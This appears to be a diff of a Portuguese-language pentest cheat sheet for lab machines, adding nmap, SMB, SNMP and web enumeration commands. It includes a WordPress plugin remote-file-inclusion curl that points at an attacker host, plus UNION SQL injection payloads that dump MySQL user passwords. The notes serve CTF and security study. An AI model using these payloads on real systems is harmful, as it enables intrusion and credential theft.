@@ -3224,9 +3224,9 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#nmap" class="md-nav__link">
+  <a href="#nmap-enumeracao-de-portas-e-servicos" class="md-nav__link">
     <span class="md-ellipsis">
-      NMAP
+      NMAP - Enumeração de Portas e Serviços
     </span>
   </a>
   
@@ -3236,6 +3236,24 @@
   <a href="#smb" class="md-nav__link">
     <span class="md-ellipsis">
       SMB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#snmp-port-161-udp" class="md-nav__link">
+    <span class="md-ellipsis">
+      SNMP PORT 161 UDP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-enumeracao-e-exploracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      WEB - Enumeração e Exploração
     </span>
   </a>
   
@@ -3257,7 +3275,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#nmap_1" class="md-nav__link">
+  <a href="#nmap" class="md-nav__link">
     <span class="md-ellipsis">
       NMAP
     </span>
@@ -3606,38 +3624,44 @@
 
 <h2 id="port-service-enumeration">Port &amp; Service Enumeration</h2>
 <h1 id="linux">Linux</h1>
-<h2 id="nmap">NMAP</h2>
-<div class="highlight"><pre><span></span><code><span class="c1"># Defina o IP alvo antes de iniciar</span>
+<h2 id="nmap-enumeracao-de-portas-e-servicos">NMAP - Enumeração de Portas e Serviços</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Definir IP alvo</span>
 <span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.10.11.28
 
-<span class="c1"># init </span>
-sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-oN<span class="w"> </span>nmap/recon
-sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="o">=</span><span class="m">100</span><span class="w"> </span>--reason<span class="w"> </span>-oN<span class="w"> </span>nmap/udp-ports<span class="w"> </span>-v
-
-<span class="c1"># Reconhecimento inicial com scripts e detecção de versão, portas abertas e sem DNS</span>
+<span class="c1"># TCP - Reconhecimento inicial com scripts e detecção de versão</span>
 sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-oN<span class="w"> </span>nmap/recon
 
-<span class="c1"># Top 100 portas UDP com motivos de resposta</span>
+<span class="c1"># UDP - Top 100 portas com motivo de resposta</span>
 sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="o">=</span><span class="m">100</span><span class="w"> </span>--reason<span class="w"> </span>-oN<span class="w"> </span>nmap/udp-ports<span class="w"> </span>-v
 
-<span class="c1"># Scan completo (todas as 65535 portas TCP)</span>
-<span class="c1"># Útil para detectar serviços em portas não padrão, com alta taxa de pacotes</span>
+<span class="c1"># Full TCP scan (todas as 65535 portas)</span>
 nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="nv">$IP</span>
 
-<span class="c1"># TCP Connect Scan (quando -sS está bloqueado ou sem root)</span>
-<span class="c1"># Pode ajudar a bypassar firewalls ou IPS que detectam SYN scan</span>
+<span class="c1"># TCP Connect Scan (quando -sS está bloqueado)</span>
 nmap<span class="w"> </span>-sT<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-oA<span class="w"> </span>nmap/alltcp<span class="w"> </span><span class="nv">$IP</span>
 
-<span class="c1"># Enumeração com scripts padrão e detecção de versão nas portas abertas</span>
-<span class="c1"># Após o full scan, adapte as portas encontradas neste comando</span>
-nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,3000<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>scans/scripts<span class="w"> </span><span class="nv">$IP</span><span class="w">  </span><span class="c1"># Substitua pelas portas relevantes (ex: 79,111 ou 4555)</span>
+<span class="c1"># Após identificação de portas específicas</span>
+nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,3000<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>scans/scripts<span class="w"> </span><span class="nv">$IP</span>
 
-<span class="c1"># Scan básico sem especificar portas (verifica portas comuns)</span>
-<span class="c1"># Útil como recon inicial rápida</span>
+<span class="c1"># Scan inicial rápido</span>
 nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-oA<span class="w"> </span>nmap/initial<span class="w"> </span><span class="nv">$IP</span>
 
-<span class="c1">### ORGANIZAR AINDA</span>
+<span class="c1"># Detecção de sistema operacional</span>
+sudo<span class="w"> </span>nmap<span class="w"> </span>-O<span class="w"> </span>--osscan-guess<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,443<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-oN<span class="w"> </span>nmap/os-detection
 
+<span class="c1"># Detecção de versão detalhada</span>
+sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>--version-all<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,443<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-oN<span class="w"> </span>nmap/version-details
+
+<span class="c1"># Nmap completo TCP</span>
+nmap<span class="w"> </span>-sT<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-oA<span class="w"> </span>nmap/alltcp<span class="w"> </span><span class="m">10</span>.10.10.117
+
+<span class="c1"># Nmap completo UDP</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-oA<span class="w"> </span>nmap/alludp<span class="w"> </span><span class="m">10</span>.10.10.117
+
+<span class="c1"># Nmap com scripts e portas específicas</span>
+nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span>,80,1111,6697,8067,65534<span class="w"> </span>-oA<span class="w"> </span>nmap/scripts<span class="w"> </span><span class="m">10</span>.10.10.117
+
+<span class="c1"># Rustscan - porta rápida + integração com Nmap</span>
 rustscan<span class="w"> </span>--addresses<span class="w"> </span><span class="m">192</span>.168.189.125<span class="w"> </span>--ulimit<span class="w"> </span><span class="m">5000</span><span class="w"> </span>--<span class="w"> </span>-A<span class="w"> </span>-sC<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-T<span class="w"> </span><span class="m">1500</span>
 </code></pre></div>
 <h2 id="smb">SMB</h2>
@@ -3649,10 +3673,100 @@ smbclient<span class="w"> </span><span class="se">\\\\</span><span class="m">192
 prompt<span class="w"> </span>OFF<span class="w">     </span><span class="c1"># desativa confirmação para cada arquivo</span>
 recurse<span class="w"> </span>ON<span class="w">     </span><span class="c1"># ativa recursividade para baixar diretórios</span>
 mget<span class="w"> </span>*<span class="w">         </span><span class="c1"># baixa todos os arquivos e pastas do share</span>
+
+<span class="c1"># Acesso anônimo - listar shares disponíveis</span>
+smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$IP</span><span class="w"> </span>-N
+
+<span class="c1"># Enumeração completa via enum4linux-ng</span>
+enum4linux-ng<span class="w"> </span>-A<span class="w"> </span><span class="nv">$IP</span>
+
+<span class="c1"># Nmap com scripts SMB</span>
+nmap<span class="w"> </span>--script<span class="w"> </span>smb-enum-shares.nse,smb-enum-users.nse<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-oN<span class="w"> </span>nmap/smb-enum
+</code></pre></div>
+<h2 id="snmp-port-161-udp">SNMP PORT 161 UDP</h2>
+<div class="highlight"><pre><span></span><code><span class="c1">## SNMP - Enumeração e Brute-force</span>
+
+<span class="c1"># SNMP básico com community string &quot;public&quot;</span>
+snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">10</span>.10.11.193
+
+<span class="c1"># Tentativa com outra community string</span>
+<span class="nb">time</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>internal<span class="w"> </span><span class="m">10</span>.10.11.193
+
+<span class="c1"># Bulk SNMP</span>
+<span class="nb">time</span><span class="w"> </span>snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>internal<span class="w"> </span><span class="m">10</span>.10.11.193
+
+<span class="c1"># Brute-force SNMP community strings com script Python</span>
+python<span class="w"> </span>/opt/SNMP-Brute/snmpbrute.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.10.11.193
+</code></pre></div>
+<h2 id="web-enumeracao-e-exploracao">WEB - Enumeração e Exploração</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Gobuster - root da porta 80</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.88<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>txt,php,html<span class="w"> </span>-o<span class="w"> </span>gobuster/port80root.txt
+
+<span class="c1"># Gobuster - diretório webservices</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.88/webservices<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>txt,php,html<span class="w"> </span>-t<span class="w"> </span><span class="m">30</span><span class="w"> </span>-o<span class="w"> </span>gobuster/port80webservices.txt
+
+<span class="c1"># Gobuster - diretório raiz de outro host</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.6<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-o<span class="w"> </span>scans/gobuster-root-med<span class="w"> </span>-t<span class="w"> </span><span class="m">40</span>
+
+<span class="c1"># Gobuster - extensão php em lista menor</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.143<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<span class="w"> </span>-x<span class="w"> </span>php<span class="w"> </span>-o<span class="w"> </span>scans/gobuster-80-root-php<span class="w"> </span>-t<span class="w"> </span><span class="m">40</span>
+
+<span class="c1"># Gobuster - com wordlist lowercase</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.68<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+<span class="c1"># Feroxbuster - raiz mentorquotes.htb</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://mentorquotes.htb
+
+<span class="c1"># Feroxbuster - API com métodos GET/POST</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://api.mentorquotes.htb<span class="w"> </span>--no-recursion<span class="w"> </span>--methods<span class="w"> </span>GET,POST
+
+<span class="c1"># Feroxbuster - diretório admin na API</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://api.mentorquotes.htb/admin/<span class="w"> </span>--no-recursion<span class="w"> </span>--methods<span class="w"> </span>GET,POST
+
+<span class="c1"># Feroxbuster - domínio devvortex.htb com extensão html</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://devvortex.htb<span class="w"> </span>-x<span class="w"> </span>html
+
+<span class="c1"># FFUF - subdomínios de usage.htb</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.18<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.usage.htb&quot;</span><span class="w"> </span>-w<span class="w"> </span>/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt<span class="w"> </span>-ac
+
+<span class="c1"># FFUF - subdomínios de mentorquotes.htb</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.193<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.mentorquotes.htb&quot;</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>-fw<span class="w"> </span><span class="m">18</span><span class="w"> </span>-mc<span class="w"> </span>all
+
+<span class="c1"># FFUF - subdomínios de devvortex.htb</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.242<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Host: FUZZ.devvortex.htb&#39;</span><span class="w"> </span>-w<span class="w"> </span>/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt<span class="w"> </span>-mc<span class="w"> </span>all<span class="w"> </span>-ac
+
+<span class="c1"># WPScan - enumeração de plugins, temas e usuários</span>
+wpscan<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.88/webservices/wp/<span class="w"> </span>--enumerate<span class="w"> </span>p,t,u<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>wpscan.log
+
+<span class="c1"># LFI via plugin do WordPress</span>
+curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/&quot;</span>
+
+<span class="c1"># SQLMAP - automatizado em parâmetro &#39;cod&#39;</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.143/room.php?cod<span class="o">=</span><span class="m">1</span>
+
+<span class="c1"># SQLi manual - testando quantidade de colunas com UNION</span>
+<span class="c1"># Exemplo: http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -</span>
+
+<span class="c1"># Listar bancos</span>
+<span class="c1"># SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 FROM information_schema.schemata;-- -</span>
+
+<span class="c1"># Tabelas no DB &#39;hotel&#39;</span>
+<span class="c1"># SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema=&#39;hotel&#39;;-- -</span>
+
+<span class="c1"># Colunas da tabela &#39;room&#39;</span>
+<span class="c1"># SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 FROM information_schema.columns WHERE table_name=&#39;room&#39;;-- -</span>
+
+<span class="c1"># Usuários do MySQL</span>
+<span class="c1"># SELECT 1, user,3, 4,password, 6, 7 FROM mysql.user;-- -</span>
+
+<span class="c1"># Teste simples de SQLi em formulários</span>
+<span class="c1"># Enviar `&#39;` e observar se há erro 500</span>
+<span class="c1"># Tentar: &#39; or 1=1 limit 1;-- -</span>
+<span class="c1"># Gera: select * from users where email = &#39;&#39; or 1=1;-- -&#39;;</span>
 </code></pre></div>
 <hr />
 <h1 id="windows">Windows</h1>
-<h2 id="nmap_1">NMAP</h2>
+<h2 id="nmap">NMAP</h2>
 <div class="highlight"><pre><span></span><code><span class="c1"># Defina o IP alvo antes de iniciar</span>
 <span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.10.10.95
 
